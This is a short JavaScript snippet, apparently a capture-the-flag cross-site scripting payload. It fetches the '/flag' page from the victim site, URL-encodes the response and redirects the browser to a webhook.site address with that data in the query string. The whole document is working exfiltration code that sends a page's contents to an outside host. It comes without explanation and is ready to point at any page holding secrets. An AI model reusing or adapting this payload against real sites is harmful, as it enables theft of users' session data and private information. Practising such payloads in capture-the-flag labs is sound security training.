async function sendFlagToWebhook(webhookUrl) {
  try {
    const response = await fetch('/flag');
    const data = await response.text();
    console.log(data);

    const encodedData = encodeURIComponent(data);
    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;

    document.location = urlWithQueryParams;
  } catch (error) {
    console.error('Error:', error);
  }
}

sendFlagToWebhook('https://webhook.site/e31f65a7-3101-4b50-960d-60cf2ffda106');
